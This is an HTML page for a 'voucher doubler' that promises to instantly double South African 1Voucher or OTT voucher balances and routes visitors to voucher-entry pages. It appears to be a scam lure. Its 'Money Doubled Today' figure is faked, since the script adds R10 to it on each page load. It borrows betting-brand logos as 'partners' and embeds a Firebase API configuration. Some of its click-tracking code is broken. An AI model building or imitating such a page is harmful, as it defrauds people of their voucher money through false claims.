<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voucher Selector</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .money-doubled-container {
            background: #222;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px rgba(0, 255, 255, 0.3);
            color: #00ffcc;
            font-size: 18px;
            font-weight: bold;
            border: 2px solid #00ffcc;
            width: 90%;
            max-width: 400px;
            text-shadow: 0 0 5px rgba(0, 255, 255, 0.7);
        }
        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }
        .description {
            font-size: 16px;
            color: #555;
            max-width: 350px;
            margin-bottom: 20px;
        }
        .voucher-container {
            width: 90%;
            max-width: 400px;
        }
        .voucher {
            background: white;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 15px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: transform 0.2s;
        }
        .voucher:hover {
            transform: scale(1.05);
        }
        .voucher img {
            width: 60px;
            height: 60px;
            border-radius: 8px;
            object-fit: cover;
        }
        .voucher-name {
            font-size: 18px;
            font-weight: bold;
        }
        .select-button {
            background-color: #ff5e7d;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .select-button:hover {
            background-color: #ff2e5a;
        }
        .partners-container {
            margin-top: 40px;
            width: 100%;
            text-align: center;
            display: flex;
            justify-content: center;
            gap: 40px;
        }
        .partners-container img {
            width: 150px;
            height: auto;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.7);
            transition: transform 0.3s;
        }
        .partners-container img:hover {
            transform: scale(1.1);
        }
        .partners-title {
            font-size: 20px;
            margin-bottom: 15px;
            font-weight: bold;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="money-doubled-container">
        <span>Money Doubled Today: <span id="money-doubled">R0</span></span>
    </div>
    <div class="title">DOUBLE THE BALANCE</div>
    <div class="description">Enter a 1 Voucher or OTT Voucher worth anywhere from R1 minimum to R20 maximum, and this tool will double your balance instantly!</div>
    <div class="voucher-container">
        <div class="voucher" id="1voucher">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSf4pEye3CaIQ6AU8cmjy7aasJDXN5QaaIHfWCPX3qBj_I89AREOz8LWgU&s=10" alt="Top Voucher">
            <span class="voucher-name">Top Voucher</span>
            <button class="select-button">Select</button>
        </div>
        <div class="voucher" id="ottvoucher">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQQKRfbFqKY4HOg9JoasWJ-GbUszwryFDaCqp8c3oLFDaOeCvvnoELJBc&s=10" alt="OTT Voucher">
            <span class="voucher-name">OTT Voucher</span>
            <button class="select-button">Select</button>
        </div>
    </div>
    <div class="partners-container">
        <div class="partners-title">Proud Partners</div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Betway_logo.jpg/1200px-Betway_logo.jpg" alt="Betway">
        <img src="https://pictures.ua.tribuna.com/image/207edc81-e94a-4a37-b1dd-67ccd465a796?width=1920&quality=70" alt="Hollywood Bets">
    </div>

    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getDatabase, ref, set, update, get } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
        
        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDFHskUWiyHhZke3KT9kkOtFI_gPsKfiGo",
            authDomain: "itzhoyoo-f9f7e.firebaseapp.com",
            databaseURL: "https://itzhoyoo-f9f7e-default-rtdb.firebaseio.com",
            projectId: "itzhoyoo-f9f7e",
            storageBucket: "itzhoyoo-f9f7e.firebasestorage.app",
            messagingSenderId: "1094792075584",
            appId: "1:1094792075584:web:d49e9c3f899d3cd31082a5",
            measurementId: "G-LLT6F9WRKH"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const moneyDoubledRef = ref(db, 'moneyDoubledToday');
        const viewsRef = ref(db, 'pageViews');
        const clicksRef = ref(db, 'voucherClicks');

        // Load and display money doubled today
        get(moneyDoubledRef).then((snapshot) => {
            let moneyDoubled = snapshot.val() || 0;
            document.getElementById('money-doubled').innerText = `R${moneyDoubled}`;
        });

        // Increment page view count
        get(viewsRef).then((snapshot) => {
            let pageViews = snapshot.val() || 0;
            set(viewsRef, pageViews + 1);
        });

        // Increment click counters on button clicks
        document.getElementById('1voucher').addEventListener('click', () => {
            window.location.href = '1voucher.html';
            update(clicksRef, { 1voucherClicks: (snapshot.val()?.1voucherClicks || 0) + 1 });
        });

        document.getElementById('ottvoucher').addEventListener('click', () => {
            window.location.href = 'ottvoucher.html';
            update(clicksRef, { ottvoucherClicks: (snapshot.val()?.ottvoucherClicks || 0) + 1 });
        });

        // Increment money doubler amount on page load
        get(moneyDoubledRef).then((snapshot) => {
            let moneyDoubled = snapshot.val() || 0;
            set(moneyDoubledRef, moneyDoubled + 10);
        });
    </script>
</body>
</html>
